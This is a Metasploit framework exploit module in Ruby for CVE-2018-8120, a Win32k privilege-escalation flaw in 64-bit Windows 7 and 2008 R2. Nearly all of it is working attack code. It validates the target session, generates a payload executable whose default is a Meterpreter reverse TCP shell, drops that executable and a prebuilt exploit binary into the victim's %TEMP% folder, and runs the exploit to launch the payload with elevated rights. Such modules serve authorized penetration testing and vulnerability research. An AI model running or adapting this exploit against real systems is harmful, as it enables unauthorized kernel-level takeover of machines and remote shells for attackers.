##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = GoodRanking

  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Exploit::EXE
  include Msf::Post::Windows::Process

def initialize(info={})
    super(update_info(info, {
      'Name'            => 'Windows ClientCopyImage Win32k Exploit',
      'Description'     => %q{
        This module exploits elevation of privilege vulnerability exists in Windows 7 and 2008 R2
        when the Win32k component fails to properly handle objects in memory. An attacker who
        successfully exploited this vulnerability could run arbitrary code in kernel mode. An
        attacker could then install programs; view, change, or delete data; or create new
        accounts with full user rights.
      },
      'License'         => MSF_LICENSE,
      'Author'          => [
          'unamer', # Exploit PoC
          'bigric3', # Analysis and exploit
          'Anton Cherepanov', # Vulnerability discovery
          'Dhiraj Mishra <dhiraj@notsosecure.com>' # Metasploit module
        ],
      'Arch'            => [ ARCH_X64 ],
      'Platform'        => 'win',
      'SessionTypes'    => [ 'meterpreter' ],
      'DefaultOptions'  => {
          'EXITFUNC'    => 'thread',
          'PAYLOAD'     => 'windows/x64/meterpreter/reverse_tcp'
        },
      'Targets'         => [
          [ 'Windows x64', { 'Arch' => ARCH_X64 } ]
        ],
      'Payload'         => {
          'Space'       => 4096,
          'DisableNops' => true
        },
      'References'      => [
          ['BID', '104034'],
          ['CVE', '2018-8120'],
          ['URL', 'https://github.com/unamer/CVE-2018-8120'],
          ['URL', 'https://github.com/bigric3/cve-2018-8120'],
          ['URL', 'http://bigric3.blogspot.com/2018/05/cve-2018-8120-analysis-and-exploit.html'],
          ['URL', 'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8120']
        ],
      'DisclosureDate'  => 'May 9 2018',
      'DefaultTarget'   => 0
    }))

  def validate_target
    if is_system?
      fail_with(Failure::None, 'Session is already elevated')
    end

    if sysinfo['Architecture'] == ARCH_X86
      fail_with(Failure::NoTarget, 'Exploit code is 64-bit only')
    end

    if sysinfo['OS'] =~ /XP/
      fail_with(Failure::Unknown, 'The exploit binary does not support Windows XP')
    end
  end

  def write_exe_to_target(rexe, rexename)
    begin
      vprint_warning("Writing file to %TEMP%")
        print_good("Exploiting SetImeInfoEx Win32k NULL Pointer Dereference")
        temprexe = session.fs.file.expand_path("%TEMP%") + "\\" + rexename
      write_file_to_target(temprexe,rexe)
    end
    vprint_good("File path: #{temprexe}")
    temprexe
  end

   def write_file_to_target(temprexe,rexe)
     fd = session.fs.file.new(temprexe, "wb")
       fd.write(rexe)
     fd.close
  end

   def create_payload_from_file(exec)
      vprint_status("Reading payload from file #{exec}")
       ::IO.read(exec)
   end

  def exploit
    @payload_name = datastore['PAYLOAD']
    rexename = "#{Rex::Text.rand_text_alphanumeric(10)}.exe"
    vprint_status("EXE's name is: #{rexename}")
    exe = generate_payload_exe
    tempdir = session.sys.config.getenv('TEMP')
    tempexename = Rex::Text.rand_text_alpha(rand(8)+6)

      cmd = "#{tempdir}\\#{tempexename}.exe"
      vprint_status("Preparing payload at #{cmd}")
      write_file(cmd, exe)
      vprint_status("Payload uploaded to temp folder")
      rexe = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2018-8120', 'CVE-2018-8120.exe')
      raw = create_payload_from_file(rexe)
      script_on_target = write_exe_to_target(raw, rexename)
      command = "#{session.fs.file.expand_path("%TEMP%")}\\#{rexename}"
      vprint_status("Location of CVE-2018-8120.exe is: #{command}")

    command += " "
    command += "#{cmd}"
    vprint_status("Executing command : #{command}")
    command_output = cmd_exec_get_pid(command)
    print_line(command_output)
    print_good('Exploit finished, wait for privileged payload execution to complete.')
  end
 end
end
